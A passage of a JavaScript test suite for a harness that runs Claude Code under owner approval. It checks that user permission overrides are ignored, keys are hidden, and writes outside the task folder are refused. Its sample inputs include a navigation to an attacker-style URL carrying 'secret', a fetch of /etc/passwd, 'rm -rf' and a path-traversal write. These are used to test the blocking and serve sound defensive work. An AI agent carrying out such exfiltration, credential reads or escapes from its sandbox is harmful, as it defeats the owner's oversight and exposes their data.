    assert.ok(existsSync(`${jt.goFile}.failed`), "a live turn's launcher is told");
    jt.cleanup();
    assert.ok(!existsSync(`${jt.goFile}.failed`), "cleanup removes the marker");
  } finally {
    for (const [k, v] of Object.entries(was)) if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
});


await test("a user settings file allowing Bash, with a hook and a key, takes no effect", async () => {
  // As the real CLI would find it, in the HOME Claude Code runs with.
  mkdirSync(join(home, ".claude"), { recursive: true });
  const userKey = fakeSecret("sk", "ant", "U".repeat(40));
  writeFileSync(join(home, ".claude", "settings.json"), JSON.stringify({ permissions: { allow: ["Bash", "WebFetch"], defaultMode: "bypassPermissions" }, env: { ANTHROPIC_API_KEY: userKey }, hooks: { PreToolUse: [{ matcher: "*", hooks: [{ type: "command", command: "echo allow" }] }] }, enabledPlugins: { "x@y": true } }));
  await runner.runClaudeTurn({ cmd: cmd(), input: "MODE:ok", parse: cli.claudeDriver.parse, onEvent: () => {} });
  const seen = JSON.parse(readFileSync(join(home, "fake-claude.json"), "utf8"));
  const at = (f) => seen.args[seen.args.indexOf(f) + 1];
  assert.ok(seen.args.includes("--restricted"), "--restricted: no user, project or local settings files");
  assert.equal(at("--setting-sources"), "", "no setting sources at all, passed as an empty argument");
  const inline = JSON.parse(at("--settings"));
  assert.equal(inline.disableAllHooks, true);
  assert.ok(!inline.permissions.allow.includes("Bash") && !inline.permissions.allow.includes("WebFetch"));
  assert.equal(inline.permissions.defaultMode, "default");
  assert.ok(!JSON.stringify(seen.args).includes(userKey) && !JSON.stringify(seen.env).includes(userKey));
  rmSync(join(home, ".claude"), { recursive: true, force: true });
});

await test("MCP config: the bot's browser tools and the approve tool, which talks only to this PC's loopback", () => {
  const conf = runner.claudeMcpConfig({ browser: { command: "node", args: ["cli.js", "--cdp-endpoint", "http://127.0.0.1:9333"] }, node: "node", approveScript: "vm/pc-approve-mcp.mjs", approve: { url: "http://127.0.0.1:3210/api/apps/call", session: "ses_1", key: "botkey" } });
  assert.deepEqual(Object.keys(conf.mcpServers), ["browser", "bops"]);
  assert.equal(conf.mcpServers.bops.env.BOPS_APPROVE_URL, "http://127.0.0.1:3210/api/apps/call");
  assert.ok(!JSON.stringify(conf).includes(EXEC_KEY));
});

const events = [];
let answer;
await test("cwd confinement and output mapping: runs in the task's workspace; steps, caption and answer", async () => {
  process.env.OPENAI_EXECUTOR_API_KEY = EXEC_KEY;
  answer = await runner.runClaudeTurn({ cmd: cmd(), input: "Write notes. MODE:ok", parse: cli.claudeDriver.parse, onEvent: (e) => events.push(e) });
  const seen = JSON.parse(readFileSync(join(home, "fake-claude.json"), "utf8"));
  assert.equal(seen.cwd, workspace, "Claude Code's working folder is the task's workspace");
  assert.equal(seen.input, "Write notes. MODE:ok", "the prompt goes in on stdin");
  assert.equal(answer.text, "All done: wrote notes.md");
  assert.equal(answer.session, "11111111-2222-4333-8444-555555555555");
  const types = events.map((e) => e.type);
  assert.deepEqual(types, ["started", "thinking", "tool", "tool", "tool", "text", "result"]);
  const tools = events.filter((e) => e.type === "tool");
  assert.equal(tools[0].detail, "ran ls");
  assert.equal(tools[1].detail, "wrote notes.md");
  assert.equal(tools[2].tool, "browser_navigate", "Bops' browser tools by their own names, worded by sessions.ts");
  assert.equal(events.find((e) => e.type === "thinking").text, "Checking the folder");
});

await test("no key reaches Claude Code, its events, a log or the state", () => {
  const seen = JSON.parse(readFileSync(join(home, "fake-claude.json"), "utf8"));
  const envText = JSON.stringify(seen.env);
  for (const v of [EXEC_KEY, ...Object.values(PLANTED)]) assert.ok(!envText.includes(v), "no planted secret in Claude Code's environment");
  for (const k of Object.keys(seen.env)) assert.doesNotMatch(k, /^(OPENAI|ANTHROPIC|BOPS|CLAUDE_CODE)_/, `${k} isn't passed`);
  assert.equal(seen.env.HOME, home, "its own sign in, found from the user's home");
  const evText = JSON.stringify(events);
  assert.ok(!evText.includes(EXEC_KEY), "a key Claude Code happened to say is hidden");
  assert.ok(evText.includes("[hidden]"));
  assert.ok(!logs.join("\n").includes(EXEC_KEY) && !logs.join("\n").includes(PLANTED.ANTHROPIC_API_KEY), "nothing logged a key");
  delete process.env.OPENAI_EXECUTOR_API_KEY;
});

await test("failure paths: a turn that isn't signed in, at its limit, or a crash says what to do, never fakes success", async () => {
  const run = (mode) => runner.runClaudeTurn({ cmd: cmd(), input: `MODE:${mode}`, parse: cli.claudeDriver.parse, onEvent: () => {} });
  await assert.rejects(run("auth"), (e) => e instanceof runner.PcTaskError && e.message === runner.PC_WORDS.signIn);
  await assert.rejects(run("limit"), (e) => e.message === runner.PC_WORDS.limit);
  await assert.rejects(run("crash"), (e) => e.message === runner.PC_WORDS.signIn && !/x-api-key|Unauthorized/.test(e.message), "its own output is never shown");
  await assert.rejects(run("okexit1"), (e) => e instanceof runner.PcTaskError && /ended with an error after it answered/.test(e.message), "a success result then exit 1 is not success");
  const utf = await run("utf8");
  assert.equal(utf.text, "Café 👍 naïve", "a character split across two reads stays whole");
  const denied = [];
  const r = await runner.runClaudeTurn({ cmd: cmd(), input: "MODE:denied", parse: cli.claudeDriver.parse, onEvent: () => {}, onDenied: (t) => denied.push(...t) });
  assert.deepEqual(denied, ["Bash"], "a tool that wasn't approved is said in the thread, not lost");
  assert.equal(r.text, "I couldn't run it.");
  const missing = { ...cmd(), file: join(tmp, "nope", "claude") };
  await assert.rejects(runner.runClaudeTurn({ cmd: missing, input: "x", parse: cli.claudeDriver.parse, onEvent: () => {} }), (e) => e.message === runner.PC_WORDS.noClaude);
  const gone = { ...cmd(), cwd: join(tmp, "no-such-folder") };
  await assert.rejects(runner.runClaudeTurn({ cmd: gone, input: "x", parse: cli.claudeDriver.parse, onEvent: () => {} }), /folder on this PC is missing/);
  const ac = new AbortController();
  ac.abort();
  await assert.rejects(runner.runClaudeTurn({ cmd: cmd(), input: "x", parse: cli.claudeDriver.parse, onEvent: () => {}, signal: ac.signal }), /Stopped by you/);
});

await test("approve tool: asks the owner through Bops for a PC task's click; never for itself; a no is a no", async () => {
  const body = [];
  let reply = { behavior: "allow" };
  const server = createServer((req, res) => {
    let data = "";
    req.on("data", (d) => (data += d));
    req.on("end", () => {
      body.push({ key: req.headers["x-bops-key"], ...JSON.parse(data) });
      res.end(JSON.stringify(reply));
    });
  });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const url = `http://127.0.0.1:${server.address().port}/api/apps/call`;
  const call = (env, args) =>
    new Promise((resolve) => {
      const child = spawn(process.execPath, [join(root, "vm/pc-approve-mcp.mjs")], { env: { PATH: process.env.PATH, ...env } });
      let out = "";
      child.stdout.on("data", (d) => {
        out += d;
        const lines = out.trim().split("\n");
        if (lines.length >= 2) {
          child.kill();
          resolve({ list: JSON.parse(lines[0]), call: JSON.parse(JSON.parse(lines[1]).result.content[0].text) });
        }
      });
      child.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list" })}\n${JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "approve", arguments: args } })}\n`);
    });
  const env = { BOPS_APPROVE_URL: url, BOPS_APPROVE_SESSION: "ses_1", BOPS_APPROVE_KEY: "botkey" };
  const yes = await call(env, { tool_name: "mcp__browser__browser_click", input: { ref: "e1" } });
  assert.equal(yes.list.result.tools[0].name, "approve");
  assert.deepEqual(yes.call, { behavior: "allow", updatedInput: { ref: "e1" } });
  assert.deepEqual(body[0], { key: "botkey", session: "ses_1", tool: "approve", args: { tool: "mcp__browser__browser_click", input: { ref: "e1" } } });
  reply = { behavior: "deny", message: "Kevin said no." };
  assert.deepEqual((await call(env, { tool_name: "Bash", input: { command: "rm -rf x" } })).call, { behavior: "deny", message: "Kevin said no." });
  const nowhere = await call({ ...env, BOPS_APPROVE_URL: "https://example.com/api/apps/call" }, { tool_name: "Bash", input: {} });
  assert.equal(nowhere.call.behavior, "deny", "only this PC's loopback is asked");
  server.close();

  // Bops' side (cli-agents.ts approveTool): a PC task's browser click asks the owner; the approve tool itself never.
  fakeState.sessions.set("ses_1", { id: "ses_1", status: "running" });
  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_click", input: {} })).behavior, "deny", "not a PC task: turned down");
  const notes = [];
  cli.pcClaudeThreads.set("ses_1", { workspace, origins: new Set(), note: (t) => notes.push(t) });
  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_click", input: { ref: "e1" } })).behavior, "allow");
  assert.equal(asked.length, 1);
  assert.equal(asked[0].action, "Use browser_click");
  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__bops__approve", input: {} })).behavior, "deny");
  assert.equal(asked.length, 1, "the model calling approve itself never shows a card");

  // WebFetch and navigation to a new site ask; once allowed, the same site goes on without a card; another asks again.
  const before = asked.length;
  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "WebFetch", input: { url: "https://example.com/a?x=1" } })).behavior, "allow");
  assert.equal(asked.length, before + 1, "a new site asks the owner");
  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_navigate", input: { url: "https://example.com/b" } })).behavior, "allow");
  assert.equal(asked.length, before + 1, "the same site doesn't ask again");
  await cli.approveTool("bot1", "ses_1", { tool: "mcp__browser__browser_navigate", input: { url: "https://attacker.example.net/?d=secret" } });
  assert.equal(asked.length, before + 2, "a new origin asks");
  assert.equal(JSON.parse(await cli.approveTool("bot1", "ses_1", { tool: "WebFetch", input: { url: "file:///etc/passwd" } })).behavior, "deny");

  // Files: inside the workspace goes on without a card; a write outside it, or through a link out of it, is refused.
  const outside = join(tmp, "outside");
  mkdirSync(outside, { recursive: true });
  symlinkSync(outside, join(workspace, "link-out"), process.platform === "win32" ? "junction" : "dir");
  const n = asked.length;
  const decide = async (tool, input) => JSON.parse(await cli.approveTool("bot1", "ses_1", { tool, input })).behavior;
  assert.equal(await decide("Write", { file_path: "notes/new.md" }), "allow");
  assert.equal(await decide("Edit", { file_path: join(workspace, "a.txt") }), "allow");
  assert.equal(await decide("Write", { file_path: "../outside/x.txt" }), "deny");
  assert.equal(await decide("Write", { file_path: "link-out/x.txt" }), "deny", "a link or junction out of the folder");
  assert.equal(await decide("Edit", { file_path: join(outside, "x.txt") }), "deny");
  assert.equal(asked.length, n, "none of those showed a card");
  assert.match(notes.at(-1), /Files outside this task's folder can't be changed/);
  assert.equal(await decide("Read", { file_path: "link-out/x.txt" }), "allow", "a read outside asks the owner (the fake says yes)");
  assert.equal(asked.length, n + 1);
  assert.equal(runner.insideWorkspace(workspace, "."), true);
  assert.equal(runner.insideWorkspace(join(tmp, "missing"), "x"), false, "anything that can't be checked is outside");

  // No answer in time: a no, and said in the thread.
  globalThis.__late = true;
  assert.equal(await decide("Bash", { command: "ls" }), "deny");
  assert.match(notes.at(-1), /No answer in time, so approval for Bash failed/);
  globalThis.__late = false;
  cli.pcClaudeThreads.delete("ses_1");
});

const alive = (p) => {
  try {
    process.kill(p, 0);
    return true;
  } catch {
    return false;
  }
};
/** Start a turn whose Claude Code (the child) started a grandchild, both ignoring SIGTERM; resolve their pids. */
async function hanging(extra) {
  const pidFile = join(home, "fake-claude.pids");
  rmSync(pidFile, { force: true });
  const turn = runner.runClaudeTurn({ cmd: cmd(), input: "MODE:hang", parse: cli.claudeDriver.parse, onEvent: () => {}, graceMs: 300, ...extra });
  for (let i = 0; i < 200 && !existsSync(pidFile); i++) await new Promise((r) => setTimeout(r, 25));
  const [child, grandchild] = readFileSync(pidFile, "utf8").trim().split(" ").map(Number);
  assert.ok(alive(child) && alive(grandchild), "both running before Stop");
  return { turn, child, grandchild };
}

await test("Stop waits until Claude Code and what it started are gone, then settles", { skip: process.platform === "win32" }, async () => {
  const ac = new AbortController();
  const h = await hanging({ signal: ac.signal });
  ac.abort();
  await assert.rejects(h.turn, /Stopped by you/);
  // Checked at once, with no waiting: the turn only settled once the whole tree had exited (both ignore SIGTERM).
  assert.ok(!alive(h.child), "Claude Code is gone when the turn settles");
  assert.ok(!alive(h.grandchild), "its grandchild is gone when the turn settles");
});

await test("a turn that takes too long is stopped the same way before it settles", { skip: process.platform === "win32" }, async () => {
  const h = await hanging({ timeoutMs: 400 });
  await assert.rejects(h.turn, /took too long/);
  assert.ok(!alive(h.child) && !alive(h.grandchild));
});

rmSync(tmp, { recursive: true, force: true });
process.stdout.write(`${passed} passed\n`);
